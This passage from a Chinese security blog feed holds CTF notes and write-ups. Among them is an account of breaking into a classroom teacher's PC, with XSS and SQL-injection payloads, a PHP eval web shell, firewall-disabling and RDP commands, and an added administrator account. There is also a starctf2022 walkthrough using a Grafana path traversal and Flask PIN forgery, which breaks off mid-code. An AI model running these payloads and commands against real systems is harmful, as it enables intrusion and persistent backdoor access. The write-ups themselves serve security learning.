punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[*]exec cmd: </span><span class="token interpolation"><span class="token punctuation">&#123;</span>CMD<span class="token punctuation">&#125;</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    posScore<span class="token punctuation">(</span>pocStudentId<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span></code></pre><h2 id="Q-amp-A"><a href="#Q-amp-A" class="headerlink" title="Q&amp;A"></a>Q&amp;A</h2><h3 id="中文乱码"><a href="#中文乱码" class="headerlink" title="中文乱码"></a>中文乱码</h3><p>这个是典中典的问题了，首先数据库设置编码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">SET</span> NAMES utf8mb4<span class="token punctuation">;</span></code></pre><p>其次表设置编码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">ENGINE</span><span class="token operator">=</span><span class="token keyword">InnoDB</span> <span class="token keyword">DEFAULT</span> <span class="token keyword">CHARSET</span><span class="token operator">=</span>utf8</code></pre><p>发现还是有乱码，是php和mysql连接时候的问题，要在每个<code>$mysqli</code>前先设置字符集：<code>set names utf8</code></p><pre class="language-PHP" data-language="PHP"><code class="language-PHP">$mysqli &#x3D; new mysqli(MYSQL_HOST, MYSQL_USER, MYSQL_PASSWORD, MYSQL_DATABASE);&#x2F;&#x2F; 每个$mysqli连接执行语句前都要先执行mysqli_query($mysqli,&quot;set names utf8&quot;);</code></pre><p>这样就解决了中文乱码的问题</p><h3 id="x3D-x3D-x3D-与-x3D-x3D-的问题"><a href="#x3D-x3D-x3D-与-x3D-x3D-的问题" class="headerlink" title="&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题"></a>&#x3D;&#x3D;&#x3D;与&#x3D;&#x3D;的问题</h3><p>在<code>register.php</code>中原先有判断<code>$_POST[&#39;username&#39;]==&#39;admin&#39;</code>，因为是弱等于，导致可以重新注册一个admin账号，复现如下</p><img src="/article/eruditeFlower/image-20221005111447545.png" class="" title="image-20221005111447545" loading="lazy"><p>注册了账号，然后拿<code>admin</code>登录，非<code>admin%a0</code></p><img src="/article/eruditeFlower/image-20221005111513524.png" class="" title="image-20221005111513524" loading="lazy"><p>登录成功。原先以为是环境的问题，后来发现是数据库交互的问题</p><p>在注册的时候有这样一句话</p><p><code>$username = $mysqli-&gt;escape_string($_POST[&#39;username&#39;]);</code></p><p>$mysqli-&gt;escape_string出来的username没有被正确存进去，而是数据库直接存了一个新的admin账号</p><img src="/article/eruditeFlower/image-20221005111744267.png" class="" title="image-20221005111744267" loading="lazy"><p>我们把语句拿出来试一下</p><img src="/article/eruditeFlower/image-20221005111802999.png" class="" title="image-20221005111802999" loading="lazy"><p>可以看到php传递sql语句的时候带了%a0（这里明显看到<code>admin </code>后面是有一个空位的），但是sql处理的时候没有认，如果设置了urlencode就能看到了</p><img src="/article/eruditeFlower/image-20221005111910450.png" class="" title="image-20221005111910450" loading="lazy"><p>这里的问题可能将来也会是一个考点，一个小trick</p><p>既然是数据库的问题，那么就得更改数据的存储方式了，最后调试好想添加urlencode还是有点问题？</p><p>不管怎样首先把<code>register.php</code>判断改为强比较了</p><p><code>if ($_POST[&#39;username&#39;]===&#39;admin&#39;)</code></p><h3 id="admin登录上车的问题"><a href="#admin登录上车的问题" class="headerlink" title="admin登录上车的问题"></a>admin登录上车的问题</h3><p>因为二次注入可以修改admin密码，因为俺们是compose起的环境，平台不支持做动态靶机，比如说前一位选手改了admin密码为123，后一位随便一试结果进了……就很尴尬了。因为session是不清的，所以只要登录了admin就算通过，靶机重置也不会影响已经登录admin的选手。因此在login处添加了这一段</p><pre class="language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$row</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'username'</span><span class="token punctuation">]</span><span class="token operator">==</span><span class="token string double-quoted-string">"admin"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token variable">$random</span> <span class="token operator">=</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token function">time</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token variable">$mysqli</span><span class="token operator">-></span><span class="token function">query</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"update users set studentid='<span class="token interpolation"><span class="token variable">$random</span></span>' where username='admin'"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>不知道有没有选手爆破呢，概率很低当然也不是不可能，靶机重置同时也会重置admin密码，而靶机重置的密码规则是这样的</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">TRUNCATE</span> <span class="token keyword">TABLE</span> score<span class="token punctuation">.</span>users<span class="token punctuation">;</span><span class="token keyword">INSERT</span> <span class="token keyword">INTO</span> score<span class="token punctuation">.</span>users <span class="token keyword">VALUES</span> <span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span> <span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token string">'`head /dev/urandom | cksum | md5sum | cut -c 1-32`'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>选手并不知道，所以概率低，当然php中登录就修改admin密码只是加了一层复杂性，而且爆破会被ban的辣</p><h3 id="题目权限配给"><a href="#题目权限配给" class="headerlink" title="题目权限配给"></a>题目权限配给</h3><p>首先由于要写udf，而且是站库分离的结构，所以给予mysql的服务器插件目录写和执行权限</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">777</span> /usr/lib64/mysql/plugin/</code></pre><p>最后一步要用s位的curl提权，收回用户和组的权限，给curl添加s位</p><pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span> <span class="token number">700</span> /flag <span class="token operator">&amp;&amp;</span> <span class="token function">chmod</span> +s /bin/curl</code></pre><h4 id="数据库的权限与被搅shi后的修改"><a href="#数据库的权限与被搅shi后的修改" class="headerlink" title="数据库的权限与被搅shi后的修改"></a>数据库的权限与被搅shi后的修改</h4><p>mysql新建了一个用户ctf，分别用到以下表</p><table><thead><tr><th align="center">表名</th><th align="center">作用</th></tr></thead><tbody><tr><td align="center">challengesAll</td><td align="center">所有的题目</td></tr><tr><td align="center">randChallenges</td><td align="center">用户抽取到的题目编号</td></tr><tr><td align="center">score</td><td align="center">用户做题得分</td></tr><tr><td align="center">userAnswer</td><td align="center">用户提交的答案</td></tr><tr><td align="center">users</td><td align="center">用户注册表</td></tr><tr><td align="center">ctf</td><td align="center">提示表</td></tr></tbody></table><p>看语句</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">CREATE</span> <span class="token keyword">USER</span> <span class="token string">'ctf'</span> IDENTIFIED <span class="token keyword">BY</span> <span class="token string">'123456'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>challengesAll <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>randChallenges <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>score <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>userAnswer <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>users <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span>ctf <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span><span class="token keyword">GRANT</span> <span class="token keyword">file</span><span class="token punctuation">,</span><span class="token keyword">insert</span> <span class="token keyword">ON</span> <span class="token operator">*</span><span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre><p>后面会讲为何这样给予，最小权限原则</p><h5 id="challengesAll"><a href="#challengesAll" class="headerlink" title="challengesAll"></a>challengesAll</h5><p><code>challengesAll</code>是所有的题目，我只需要提取题目信息，在题目上线时已经确定，所以只需给予<code>select</code>权限即可</p><h5 id="randChallenges"><a href="#randChallenges" class="headerlink" title="randChallenges"></a>randChallenges</h5><p><code>randChallenges</code>是用户抽取到的题目，前面流程分析说过，用户在注册的时候会抽取题目插入到此表，因此需要<code>insert</code>权限，同时在主页用户需要做题，因此还需要<code>select</code>权限</p><h5 id="score-1"><a href="#score-1" class="headerlink" title="score"></a>score</h5><p><code>score</code>是用户的分数表，用户做完题后会插入一条记录记用户的分数，因此需要<code>select,insert</code>权限</p><h5 id="userAnswer"><a href="#userAnswer" class="headerlink" title="userAnswer"></a>userAnswer</h5><p><code>userAnswer</code>存储用户提交的答案，原因同上，也是需要<code>select,insert</code>权限</p><h5 id="users"><a href="#users" class="headerlink" title="users"></a>users</h5><p><code>users</code>是用户表，包括用户的增改查，是正常的注册系统的表权限，也就是这里可以出现修改admin密码的操作</p><h5 id="ctf"><a href="#ctf" class="headerlink" title="ctf"></a>ctf</h5><p><code>ctf</code>就是个提示表，没有交互，随意权限</p><h5 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h5><p>因为要写udf，要给予<code>file,insert</code>权限来创建和落地</p><h4 id="比赛中出现搅💩的状况"><a href="#比赛中出现搅💩的状况" class="headerlink" title="比赛中出现搅💩的状况"></a>比赛中出现搅💩的状况</h4><p>某一天晚上，突然发现题目全部被人修改了，原因就是权限给多了</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">GRANT</span> <span class="token keyword">select</span><span class="token punctuation">,</span><span class="token keyword">insert</span><span class="token punctuation">,</span><span class="token keyword">update</span> <span class="token keyword">ON</span> score<span class="token punctuation">.</span><span class="token operator">*</span> <span class="token keyword">TO</span> <span class="token string">'ctf'</span><span class="token variable">@'%'</span><span class="token punctuation">;</span></code></pre><p>图省事之前是这样给的权限，不符合最小权限原则，这次之后也是狠狠学习了一下</p><h5 id="临时措施"><a href="#临时措施" class="headerlink" title="临时措施"></a>临时措施</h5><p>当时出现了这样的情况，所以第一时间首先复原了题目，并且在群里通知选手不要修改了，因为这里对解题没有帮助，在此处也不存在非预期可以帮助解题，为了防止同学走歪路就通知了一下，但是没用，复原了还是被打了。</p><p>所以使用锁机制先限制一下，mysql有三种级别的锁定机制：表级锁定，行级锁定和页级锁定，首先锁定表，防止被进一步破坏</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">LOCK</span> <span class="token keyword">TABLES</span> challengesAll<span class="token punctuation">;</span></code></pre><p>然后开始检索权限，按照最小权限原则从新分配权限，最后下线题目，重新部署</p><h3 id="题目被爆破"><a href="#题目被爆破" class="headerlink" title="题目被爆破"></a>题目被爆破</h3><p>当时在解决搅shi的问题，然后发现多次警告后仍然有同学在爆破用户名和密码，直接手动封禁</p><p>从docker内部的话需要高级权限<code>--privileged</code>，但是这样会有安全性问题（著名的docker宿主机提权），于是直接在部署服务器上封禁，原先的命令是这样的</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> INPUT <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP <span class="token parameter variable">-dport</span> <span class="token punctuation">[</span>port<span class="token punctuation">]</span></code></pre><p>但是发现好像没生效，尝试了一下，需要配给docker用户，于是直接封禁</p><pre class="language-bash" data-language="bash"><code class="language-bash">iptables <span class="token parameter variable">-I</span> DOCKER <span class="token parameter variable">-s</span> <span class="token punctuation">[</span>ip<span class="token punctuation">]</span> <span class="token parameter variable">-j</span> DROP</code></pre><p>直接封了</p><h3 id="题目重置"><a href="#题目重置" class="headerlink" title="题目重置"></a>题目重置</h3><p>环境需要重置，一是更新admin密码，二是清空用户数据和udf，比赛时间较长，要是一直不清会有大量数据</p><p>未完待续…</p>]]></content>
      
      
      <categories>
          
          <category> Write-Up </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>记一次教师机环境的渗透</title>
      <link href="article/penetrationtest/"/>
      <url>article/penetrationtest/</url>
      
        <content type="html"><![CDATA[<p>水文章，不过是真实事件</p><span id="more"></span><p><strong>注意：</strong>本文所完成操作均已在教师知晓的情况下进行，未对正常教学产生影响，请勿模仿。</p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>某节动态WEB课，老师展示了一个Demo，内容是一个注册系统，注册完后展示有数据库全部已注册的信息（select *），既然是系统那肯定会有不安全的地方存在，老师也说开发过程中要注意种种云云，遂测试发现确实有漏洞，进而写了shell，然后拿到windows教师机权限。全部过程教师已知，以下信息已经过修改，并非真实信息，本文目的旨在技术交流，教师机每天都会进行重置还原，本文操作没有对电脑造成任何破坏，请不要对任何操作系统进行破坏或攻击。</p><h2 id="流程"><a href="#流程" class="headerlink" title="流程"></a>流程</h2><h3 id="漏洞发现"><a href="#漏洞发现" class="headerlink" title="漏洞发现"></a>漏洞发现</h3><p>毕竟是教学Demo，盲猜一手没有任何过滤，果真如此。</p><p>注册需要如下信息：姓名，密码，性别，爱好，年龄</p><p>注册是<code>index.htm</code>，提交信息到<code>doInsert.php</code>，然后直接跳转到<code>doSelect.php</code>。名称很明显，<code>doSelect.php</code>进行了一个</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">select * from table;</code></pre><p>提交到信息明显是进行了一次插入，猜测后端语句如下。</p><pre class="language-mysql" data-language="mysql"><code class="language-mysql">insert into table(Username,Passwd,Gender,Hobby,Age) values(&#39;$Username&#39;,&#39;$Passwd&#39;,&#39;$Gender&#39;,&#39;$Hobbys&#39;,&#39;$Age&#39;);</code></pre><p>抓了包看提交到数据，发现都是明文提交，没有任何加密。</p><h3 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h3><p>提交表单跳转后会直接显示在<code>doSelect.php</code>，先打一下xss。</p><p>提交POST包</p><pre class="language-http" data-language="http"><code class="language-http">Username=&lt;scRipt>alert(1)&lt;/scrIpT>&amp;Passwd=1&amp;Gender=男&amp;Hobbys=蹦极&amp;Age=20</code></pre><p>提交后发现页面没有反应，查看源码，发现username有长度限制</p><img src="/article/penetrationtest/image-20220526205826254.png" class="" title="image-20220526205826254" loading="lazy"><p>尝试后发现Hobbys处的多选项没有限制固定内容，于是尝试在Hobbys处打xss</p><pre class="language-http" data-language="http"><code class="language-http">Username=zhangsan&amp;Passwd=helloworld&amp;Gender=男&amp;Hobbys=&lt;scRipt>alert(1)&lt;/scrIpT>&amp;Age=24</code></pre><p>测试成功，成功弹窗了（虽然表格格式乱了）</p><img src="/article/penetrationtest/image-20220526210033391.png" class="" title="image-20220526210033391" loading="lazy"><h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>尝试一下注入，猜测multi没开，所以没法堆叠注入，先闭合。</p><pre class="language-http" data-language="http"><code class="language-http">Username=lisi&amp;Passwd=helloworld&amp;Gender=男\&amp;Hobbys=,version(),'24');--#&amp;Age=24</code></pre><p>这样insert的语句就变成了</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">insert</span> <span class="token keyword">into</span> <span class="token keyword">table</span><span class="token punctuation">(</span>Username<span class="token punctuation">,</span>Passwd<span class="token punctuation">,</span>Gender<span class="token punctuation">,</span>Hobby<span class="token punctuation">,</span>Age<span class="token punctuation">)</span> <span class="token keyword">values</span><span class="token punctuation">(</span><span class="token string">'lisi'</span><span class="token punctuation">,</span><span class="token string">'helloworld'</span><span class="token punctuation">,</span><span class="token string">'$Gender\','</span><span class="token punctuation">,</span>version<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token string">'24'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">--#','24');</span></code></pre><p>很完美，提交</p><img src="/article/penetrationtest/image-20220526210558793.png" class="" title="image-20220526210558793" loading="lazy"><p>再看一下用户</p><img src="/article/penetrationtest/image-20220526210617022.png" class="" title="image-20220526210617022" loading="lazy"><p>很好，明显就是phpstudy直接起的服务。</p><p>尝试了一下<code>load_file</code>，<code>into outfile</code>发现8太行，在insert语句里似乎没有执行，尝试hex出来也不行</p><h3 id="峰回路转"><a href="#峰回路转" class="headerlink" title="峰回路转"></a>峰回路转</h3><p>既然是phpstudy启动的服务，而且作为教学使用，查看一下会不会有其他有用的东西，果然发现了<code>phpinfo.php</code>，获取了其web路径为<code>D:/phpStudy/WWW</code>，看了下信息，似乎还有phpMyAdmin，访问一下<code>/phpMyAdmin</code>，果然存在。</p><img src="/article/penetrationtest/image-20220526211536947.png" class="" title="image-20220526211536947" loading="lazy"><p>直接猜解一下，登录成功。既然是root就不客气了，直接执行SQL语句在web目录写个码</p><pre class="language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token string">"&lt;?php @eval($_POST['admin']);?>"</span> <span class="token keyword">into</span> <span class="token keyword">outfile</span> <span class="token string">'D:/phpStudy/WWW/phpinfo2.php'</span><span class="token punctuation">;</span></code></pre><p>蚁剑直接连接</p><img src="/article/penetrationtest/image-20220526212000294.png" class="" title="image-20220526212000294" loading="lazy"><p>H盘是老师的U盘，为了信息安全我没有访问，当前目录打开命令行</p><img src="/article/penetrationtest/image-20220526212151492.png" class="" title="image-20220526212151492" loading="lazy"><p>很好，直接就是admin。</p><h3 id="尝试远程桌面登录"><a href="#尝试远程桌面登录" class="headerlink" title="尝试远程桌面登录"></a>尝试远程桌面登录</h3><h4 id="关闭防火墙"><a href="#关闭防火墙" class="headerlink" title="关闭防火墙"></a>关闭防火墙</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">NetSh Advfirewall set allprofiles state off </code></pre><h4 id="看看防火墙是否关闭"><a href="#看看防火墙是否关闭" class="headerlink" title="看看防火墙是否关闭"></a>看看防火墙是否关闭</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">Netsh Advfirewall show allprofiles</code></pre><h4 id="设置远程桌面端口"><a href="#设置远程桌面端口" class="headerlink" title="设置远程桌面端口"></a>设置远程桌面端口</h4><p>尝试设置3389不成功，遂转换为3390</p><pre class="language-cmd" data-language="cmd"><code class="language-cmd">reg add &quot;HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp&quot; &#x2F;t REG_DWORD &#x2F;v portnumber &#x2F;d 3390 &#x2F;f</code></pre><h4 id="开启远程桌面"><a href="#开启远程桌面" class="headerlink" title="开启远程桌面"></a>开启远程桌面</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">wmic RDTOGGLE WHERE ServerName&#x3D;&#39;%COMPUTERNAME%&#39; call SetAllowTSConnections 1</code></pre><h4 id="检查一下端口是否开放"><a href="#检查一下端口是否开放" class="headerlink" title="检查一下端口是否开放"></a>检查一下端口是否开放</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">netstat -an|find &quot;3390&quot;</code></pre><img src="/article/penetrationtest/image-20220526212630944.png" class="" title="image-20220526212630944" loading="lazy"><h4 id="添加用户"><a href="#添加用户" class="headerlink" title="添加用户"></a>添加用户</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">net user admin1 adminadmin &#x2F;add</code></pre><img src="/article/penetrationtest/image-20220526212832087.png" class="" title="image-20220526212832087" loading="lazy"><h4 id="授权用户组"><a href="#授权用户组" class="headerlink" title="授权用户组"></a>授权用户组</h4><pre class="language-cmd" data-language="cmd"><code class="language-cmd">net localgroup Administrators admin1 &#x2F;add</code></pre><img src="/article/penetrationtest/image-20220526213221439.png" class="" title="image-20220526213221439" loading="lazy"><h4 id="远程登录"><a href="#远程登录" class="headerlink" title="远程登录"></a>远程登录</h4><p>此处无图，直接在学生机登录的，在同一网段下</p><h4 id="修改多用户同时登录"><a href="#修改多用户同时登录" class="headerlink" title="修改多用户同时登录"></a>修改多用户同时登录</h4><p>登录后按照网上教程走，运行打开<code>gprdit.msc</code></p><p>然后进行如下设置</p><img src="/article/penetrationtest/image-20220526213407742.png" class="" title="image-20220526213407742" loading="lazy"><p>结束</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>渗透路上的小小一步，没什么技术含量，毕竟是和机房有关，比较有趣。也只是一个引子，打开了这个大门，以后还会继续往下学习。</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>starctf2022</title>
      <link href="article/starctf2022/"/>
      <url>article/starctf2022/</url>
      
        <content type="html"><![CDATA[<p>感觉挺有趣的</p><span id="more"></span><h1 id="Web："><a href="#Web：" class="headerlink" title="Web："></a>Web：</h1><h2 id="oh-my-grafana"><a href="#oh-my-grafana" class="headerlink" title="oh-my-grafana"></a>oh-my-grafana</h2><p>上来先搜grafana历史漏洞，果然根据版本号可以找到 <a href="https://nvd.nist.gov/vuln/detail/CVE-2021-43798">CVE-2021-43798</a> 进行目录穿越读文件。下载现成的 <a href="https://dl.packetstormsecurity.net/2112-exploits/grafana830-traversal.txt">POC</a> 把插件排除一下可以查出默认的用户名密码。</p><img src="/article/starctf2022/(null)-20220421125600359.(null)" class="" title="img" loading="lazy"><p>通过目录穿越读文件，即可以直接找<code>/etc/grafana/grafana.ini</code>，里面<code>admin_password</code>明文密码</p><p>使用用户名密码登录上系统，可以发现在 Data Source 处有 MySQL 数据库。从 Explore 功能里构造 time 写语句即可查出 flag。</p><img src="/article/starctf2022/(null)-20220421125600439.(null)" class="" title="img" loading="lazy"><pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;group_concat(tablE_nAme), 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;infOrmation_schEma.tablEs&#x2F;**&#x2F;whEre&#x2F;**&#x2F;table_schema&#x3D;databAse()</code></pre><img src="/article/starctf2022/(null)-20220421125559937.(null)" class="" title="img" loading="lazy"><pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;group_concat(column_nAme), 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;infOrmation_schEma.columns&#x2F;**&#x2F;whEre&#x2F;**&#x2F;table_schema&#x3D;databAse()</code></pre><img src="/article/starctf2022/(null)" class="" title="img" loading="lazy"><pre class="language-SQL" data-language="SQL"><code class="language-SQL">seLect&#x2F;**&#x2F;flag, 1 as time&#x2F;**&#x2F;frOm&#x2F;**&#x2F;fffffflllllllllaaaagggggg</code></pre><p>其实直接看历史就有<code>fffffflllllllllaaaagggggg</code>这个表的查询记录，直接select就行</p><hr><h2 id="oh-my-notepro"><a href="#oh-my-notepro" class="headerlink" title="oh-my-notepro"></a>oh-my-notepro</h2><p>打开题目正常逻辑流程走一遍，发现写的note会过段时间(1-3s)被修改为‘Hacked by fmyy’，过了几个小时询问出题人发现此不是题目所为，很破坏体验，在无意义的项目上折腾浪费了很长时间。</p><p>根据<code>/view</code>路由报错获取部分源码，看不到 sql 构造，知道开启了flask debug mode</p><pre class="language-Python" data-language="Python"><code class="language-Python">@login_requireddef view():    note_id &#x3D; request.args.get(&quot;note_id&quot;)    sql &#x3D; f&quot;select * from notes where note_id&#x3D;&#39;&#123;note_id&#125;&#39;&quot;    print(sql)    result &#x3D; db.session.execute(sql, params&#x3D;&#123;&quot;multi&quot;: True&#125;)    db.session.commit()    result &#x3D; result.fetchone()    data &#x3D; &#123;        &#39;title&#39;: result[4],        &#39;text&#39;: result[3],    &#125;    return render_template(&#39;note.html&#39;, data&#x3D;data)</code></pre><p>但是报错右侧有console小标，猜测一手：flask PIN码伪造，猜对了</p><p><code>/view</code>处参数<code>note_id</code>可以直接注入，有明文报错</p><img src="/article/starctf2022/(null)-20220421125600008.(null)" class="" title="img" loading="lazy"><p>根据爆的表发现其他选手都在爆machineid和cgroup，更加确定是flask PIN码伪造，读取了报错内容里flask生成PIN码的关键逻辑</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">get_pin_and_cookie_name</span><span class="token punctuation">(</span>    app<span class="token punctuation">:</span> <span class="token string">"WSGIApplication"</span><span class="token punctuation">,</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> t<span class="token punctuation">.</span>Union<span class="token punctuation">[</span>t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">]</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>Tuple<span class="token punctuation">[</span><span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">]</span><span class="token punctuation">]</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""Given an application object this returns a semi-stable 9 digit pin    code and a random key.  The hope is that this is stable between    restarts to not make debugging particularly frustrating.  If the pin    was forcefully disabled this returns `None`.    Second item in the resulting tuple is the cookie name for remembering.    """</span>    pin <span class="token operator">=</span> os<span class="token punctuation">.</span>environ<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"WERKZEUG_DEBUG_PIN"</span><span class="token punctuation">)</span>    rv <span class="token operator">=</span> <span class="token boolean">None</span>    num <span class="token operator">=</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was explicitly disabled</span>    <span class="token keyword">if</span> pin <span class="token operator">==</span> <span class="token string">"off"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">None</span><span class="token punctuation">,</span> <span class="token boolean">None</span>    <span class="token comment"># Pin was provided explicitly</span>    <span class="token keyword">if</span> pin <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span> <span class="token keyword">and</span> pin<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">.</span>isdigit<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token comment"># If there are separators in the pin, return it directly</span>        <span class="token keyword">if</span> <span class="token string">"-"</span> <span class="token keyword">in</span> pin<span class="token punctuation">:</span>            rv <span class="token operator">=</span> pin        <span class="token keyword">else</span><span class="token punctuation">:</span>            num <span class="token operator">=</span> pin    modname <span class="token operator">=</span> <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__module__"</span><span class="token punctuation">,</span> t<span class="token punctuation">.</span>cast<span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">,</span> app<span class="token punctuation">)</span><span class="token punctuation">.</span>__class__<span class="token punctuation">.</span>__module__<span class="token punctuation">)</span>    username<span class="token punctuation">:</span> t<span class="token punctuation">.</span>Optional<span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">]</span>    <span class="token keyword">try</span><span class="token punctuation">:</span>        <span class="token comment"># getuser imports the pwd module, which does not exist in Google</span>        <span class="token comment"># App Engine. It may also raise a KeyError if the UID does not</span>        <span class="token comment"># have a username, such as in Docker.</span>        username <span class="token operator">=</span> getpass<span class="token punctuation">.</span>getuser<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">except</span> <span class="token punctuation">(</span>ImportError<span class="token punctuation">,</span> KeyError<span class="token punctuation">)</span><span class="token punctuation">:</span>        username <span class="token operator">=</span> <span class="token boolean">None</span>    mod <span class="token operator">=</span> sys<span class="token punctuation">.</span>modules<span class="token punctuation">.</span>get<span class="token punctuation">(</span>modname<span class="token punctuation">)</span>    <span class="token comment"># This information only exists to make the cookie unique on the</span>    <span class="token comment"># computer, not as a security feature.</span>    probably_public_bits <span class="token operator">=</span> <span class="token punctuation">[</span>        username<span class="token punctuation">,</span>        modname<span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>app<span class="token punctuation">,</span> <span class="token string">"__name__"</span><span class="token punctuation">,</span> <span class="token builtin">type</span><span class="token punctuation">(</span>app<span class="token punctuation">)</span><span class="token punctuation">.</span>__name__<span class="token punctuation">)</span><span class="token punctuation">,</span>        <span class="token builtin">getattr</span><span class="token punctuation">(</span>mod<span class="token punctuation">,</span> <span class="token string">"__file__"</span><span class="token punctuation">,</span> <span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">,</span>    <span class="token punctuation">]</span>    <span class="token comment"># This information is here to make it harder for an attacker to</span>    <span class="token comment"># guess the cookie name.  They are unlikely to be contained anywhere</span>    <span class="token comment"># within the unauthenticated debug page.</span>    private_bits <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token builtin">str</span><span class="token punctuation">(</span>uuid<span class="token punctuation">.</span>getnode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">,</span> get_machine_id<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span>    h <span class="token 